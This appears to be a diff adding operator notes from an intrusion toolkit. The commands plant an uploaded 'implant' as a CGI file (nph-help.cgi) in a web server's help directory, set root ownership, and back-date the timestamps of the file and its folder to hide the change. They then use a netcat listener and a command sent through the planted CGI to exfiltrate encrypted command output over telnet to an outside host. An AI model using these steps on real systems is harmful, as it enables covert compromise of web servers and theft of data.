@@ -1,0 +1,10 @@
+-ls /var/www/data/help/apps/locale/ja_JP.utf-8/utilities
+-put ../up/implant i
+cp i /var/www/data/help/apps/locale/ja_JP.utf-8/utilities/nph-help.cgi
+chmod 555 /var/www/data/help/apps/locale/ja_JP.utf-8/utilities/nph-help.cgi
+chown root:nobody /var/www/data/help/apps/locale/ja_JP.utf-8/utilities/nph-help.cgi
+touch -r /var/www/data/help/apps/locale/ja_JP.utf-8/utilities/publish.html /var/www/data/help/apps/locale/ja_JP.utf-8/utilities/nph-help.cgi
+touch -r /var/www/data/help/apps/locale/ja_JP.utf-8/utilities/publish.html /var/www/data/help/apps/locale/ja_JP.utf-8/utilities/.
+
+nc -l -p 4444 | decode-base64 |   bdes -d -k 0x4790cae5ec154ccc
+se -c"(w; ls -l; ls -l /tmp) | bdes -k 0x4790cae5ec154ccc| mmencode | telnet 10.1.2.150 4444" -i"http://mp450/help/apps/locale/ja_JP.utf-8/utilities/nph-help.cgi/help"
